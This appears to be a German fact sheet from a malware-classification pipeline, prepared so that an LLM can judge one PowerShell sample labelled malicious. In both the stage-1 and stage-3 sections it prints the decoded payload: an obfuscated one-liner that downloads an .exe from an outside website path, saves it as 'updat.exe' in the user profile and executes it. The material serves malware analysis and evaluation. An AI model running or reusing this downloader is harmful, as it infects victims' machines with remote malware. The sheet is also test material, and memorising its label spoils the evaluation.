# Steckbrief: 0ab753de218dbbe2abedb69a406fc07cd30b9e607632cfaba4e398f70c49c457.ps1

- SHA256: `0ab753de218dbbe2abedb69a406fc07cd30b9e607632cfaba4e398f70c49c457`
- Groesse: 921 Bytes, 1 Zeilen
- Ground-Truth-Label (aus Ordner): **malicious**
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 0 (Auszug unten)
- Base64-Bloecke gesamt: 1, davon dekodierbar: 1
- Dekodierter Base64-Block (Laenge 828):
  ```
  [NeT.SeRViCepoIntMaNAgeR]::secUrITypRotoCOL = [NEt.seCuriTYPrOTocoLtyPE]::Tls12  ;  	IRM 	-urI  (”http://o” 	 	+ 	”zzyingilizce.com/w” 	 	+ 	”p-co” 	 	+ 	”ntent/sgu/35465486743108” 	 	+ 	”29” 	 	+ 	”.” 	 	+ 	”e” 	 	+ 	”xe” 	) 	-ouTFile ”$env:userprOfIle\updat.exe”  ; InvokE-IteM 	”$EnV:uSERpROFile\updat.exe”
  ```

## Stufe 2 - Statische Merkmale (zusaetzlich)

## Stufe 3 - Struktur (zusaetzlich)
- Dekodierte Befehle (Auszug):
  ```
  [NeT.SeRViCepoIntMaNAgeR]::secUrITypRotoCOL = [NEt.seCuriTYPrOTocoLtyPE]::Tls12  ;  	IRM 	-urI  (”http://o” 	 	+ 	”zzyingilizce.com/w” 	 	+ 	”p-co” 	 	+ 	”ntent/sgu/35465486743108” 	 	+ 	”29” 	 	+ 	”.” 	 	+ 	”e” 	 	+ 	”xe” 	) 	-ouTFile ”$env:userprOfIle\updat.exe”  ; InvokE-IteM 	”$EnV:uSERpROFile\updat.exe”
  ```
